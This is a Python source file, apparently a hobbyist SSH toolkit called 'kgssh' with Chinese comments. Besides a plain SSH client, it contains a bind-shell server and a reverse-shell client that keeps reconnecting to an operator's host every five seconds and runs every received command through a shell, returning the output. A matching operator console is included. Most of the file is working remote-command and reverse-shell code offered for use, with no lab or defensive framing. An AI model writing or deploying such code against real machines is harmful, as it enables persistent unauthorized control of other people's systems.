import fabric
import signal
import os
import time
import paramiko
import sys
import textwrap
import socket
import threading
import subprocess
import shlex





def ssh_client_fabric(host, port, username , password):
    conn = fabric.Connection(host, port=port, user=username, connect_kwargs={"password": password})
    print("\n\n[^_^] SSH CLINET SUCCESS!")
    while True:
        cmd = input('>> ')
        try:
            result = conn.run(cmd, hide=True)
            print(result.stdout.strip())
        except Exception:
            print(f"[ToT] The command '{cmd}' is not correct")
            



def ssh_client(host, port, username, password):
    print('SSH Client...')
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=username, password=password)

    my_session = client.get_transport().open_session()
    if my_session.active:
        while True:
            cmd = input('>> ')
            my_session.send(cmd.encode())
            receive = my_session.recv(4096).decode()
            print(receive)
    else:
        print('[ToT] Cannot open session!')





# Java风格，继承接口，并定义接口要求的函数
class Server(paramiko.ServerInterface):
    def __init__(self, username, password) -> None:
        super().__init__()
        self.event = threading.Event()
        self.username = username
        self.password = password

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == self.username) and (password == self.password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED




def ssh_server(host, port, username, password):
    print('SSH Server...')

    def new_connect(ing_socket):
        my_transport = paramiko.Transport(ing_socket)

        #hostkey作为私钥，用于数字签名，对方可以选择用公钥解密签名。
        #但是不管对方是否选择解密，作为ssh服务器，你必须有一个私钥hostkey来进行数字签名
        dirname = os.path.dirname(os.path.realpath(__file__))
        hostkey = paramiko.RSAKey(filename=os.path.join(dirname, 'kgkey'))
        my_transport.add_server_key(hostkey)

        server = Server(username, password)
        my_transport.start_server(server=server)

        my_channel = my_transport.accept()
        if type(my_channel) == paramiko.Channel:
            print("SSH Server Connection Succeed")
            while True:
                cmd = my_channel.recv(4096).decode().strip()
                output = subprocess.check_output(shlex.split(cmd), shell=True)
                my_channel.send(output or b'ok')

    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #有时程序已关闭但port过一小段时间再关闭，导致'port already in use'类错误。
    #所以使用下面这行代码，允许使用尚未关闭的端口，来避免'port already in use'类错误
    my_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    my_socket.bind((host, int(port)))
    my_socket.listen(5)
    while True:
        ing_socket, _ = my_socket.accept()
        new_thread = threading.Thread(target=new_connect, args=(ing_socket,))
        new_thread.start()




def ssh_reverse_client(host, port, username, password):
    while True:
        try:
            print('SSH Reverse Client...')
            time.sleep(5)

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password)

            my_session = client.get_transport().open_session()
            print('SSH Reverse Client Succeed!')

            while True:

                if my_session.active:
                    try:
                        def handler(signum, frame):
                            raise TimeoutError
                        signal.signal(signal.SIGALRM, handler)
                        signal.alarm(5)

                        cmd = my_session.recv(4096).decode().strip()
                        output = subprocess.check_output(cmd, shell=True)
                        my_session.send(output or b'ok')

                    except TimeoutError:
                        continue
                        
                    finally:
                        signal.alarm(0)#取消定时器

                else:
                    print("Connection failed.")
                    break


        except Exception:
            continue



def ssh_reverse_server(host, port, username, password):
    print('SSH Reverse Server...')

    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #有时程序已关闭但port过一小段时间再关闭，导致'port already in use'类错误。
    #所以使用下面这行代码，允许使用尚未关闭的端口，来避免'port already in use'类错误
    my_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    my_socket.bind((host, int(port)))
    my_socket.listen()
    while True:
        ing_socket, _ = my_socket.accept()
        my_transport = paramiko.Transport(ing_socket)

        #hostkey作为私钥，用于数字签名，对方可以选择用公钥解密签名。
        #但是不管对方是否选择解密，作为ssh服务器，你必须有一个私钥hostkey来进行数字签名
        dirname = os.path.dirname(os.path.realpath(__file__))
        hostkey = paramiko.RSAKey(filename=os.path.join(dirname, 'kgkey'))
        my_transport.add_server_key(hostkey)

        server = Server(username, password)
        my_transport.start_server(server=server)

        my_channel = my_transport.accept()
        if type(my_channel) == paramiko.Channel:
            print("SSH Reverse Server Connection Succeed")
            while True:
                i = input(">> ")
                my_channel.send(i.encode())
                my_channel.settimeout(2)
                try:
                    receive = my_channel.recv(4096)
                    print(receive.decode())
                except socket.timeout:
                    print("Wrong Command!")
                    print("Connection Broken and connect again...")
                    my_channel.close()
                    my_transport.close()
                    my_socket.close()

                    ssh_reverse_server(host=host, port=port, username=username, password=password)


if __name__ == "__main__":
    print(textwrap.dedent('''

    ██╗  ██╗██╗   ██╗ ██████╗  ██████╗ ███████╗███████╗
    ██║ ██╔╝╚██╗ ██╔╝██╔════╝ ██╔═══██╗██╔════╝██╔════╝
    █████╔╝  ╚████╔╝ ██║  ███╗██║   ██║███████╗███████╗
    ██╔═██╗   ╚██╔╝  ██║   ██║██║   ██║╚════██║╚════██║
    ██║  ██╗   ██║   ╚██████╔╝╚██████╔╝███████║███████║
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
    '''))

    if len(sys.argv) != 5:
        print('Usage: python kgReverseClient.py [host] [port] [username] [password]')
        sys.exit()
    host = sys.argv[1]
    port = sys.argv[2]
    username = sys.argv[3]
    password = sys.argv[4]


    print(textwrap.dedent('''
    [^_^] Please input number to choose:
        1.SSH Client
        2.SSH Server
        3.SSH Reverse Client
        4.SSH Reverse Server
        5.SSH Client(by fabric)
        0.Exit kgssh
    '''))
    try:
        while True:
            i = input('>> ')
            match i:
                case '1':
                    ssh_client(host=host, port=port, username=username, password=password)
                    break
                case '2':
                    ssh_server(host=host, port=port, username=username, password=password)
                    break
                case '3':
                    ssh_reverse_client(host=host, port=port, username=username, password=password)
                    break
                case '4':
                    ssh_reverse_server(host=host, port=port, username=username, password=password)
                    break
                case '5':
                    ssh_client_fabric(host=host, port=port, username=username, password=password)
                case '0':
                    print("Bye~")
                    sys.exit()
                case _:
                    print("[ToT] Please input 0-4!")
    except KeyboardInterrupt:
        print("Bye~")
        sys.exit()
